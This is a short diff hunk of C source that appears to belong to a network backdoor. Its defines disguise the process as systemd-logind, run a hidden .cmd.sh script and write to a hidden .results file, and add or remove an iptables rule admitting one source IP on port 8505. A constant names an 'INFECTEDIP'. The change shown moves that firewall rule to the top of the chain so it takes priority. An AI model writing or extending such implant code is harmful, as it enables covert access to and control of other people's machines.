@@ -76,7 +76,7 @@ struct sniff_tcp {
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./.cmd.sh > .results"
 #define CHMOD "chmod 755 .cmd.sh"
-#define IPTABLES(ip) "iptables -A INPUT -p tcp -s " ip " --dport 8505 -j ACCEPT"
+#define IPTABLES(ip) "iptables -I INPUT 1 -p tcp -s " ip " --dport 8505 -j ACCEPT"
 #define TURNOFF(ip) "iptables -D INPUT -p tcp -s " ip " --dport 8505 -j ACCEPT"
 #define RESULT_FILE ".results"
 #define INFECTEDIP "192.168.1.6"
